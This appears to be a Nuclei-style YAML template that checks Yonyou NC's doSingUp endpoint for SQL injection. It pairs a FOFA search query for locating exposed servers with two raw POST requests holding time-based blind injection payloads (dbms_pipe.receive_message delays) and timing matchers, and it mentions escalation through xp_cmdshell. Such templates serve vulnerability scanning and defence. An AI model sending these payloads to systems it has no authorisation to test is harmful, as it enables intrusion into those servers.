id: yongyouNC-doSingUp-sql-time

info:
  tags: yongyouNC-doSingUp-sql-time
  name: 用友NC doSingUp SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
    用友NC doSingUp 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
http:
  - raw:
      - |
        POST /portal/pt/ActivityNotice/doSingUp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        pageId=login&pk_psndoc=1&actid=1' AND 1=dbms_pipe.receive_message('RDS', 4)--
      - |
        POST /portal/pt/ActivityNotice/doSingUp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        pageId=login&pk_psndoc=1&actid=1' AND 1=dbms_pipe.receive_message('RDS', 8)--
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and
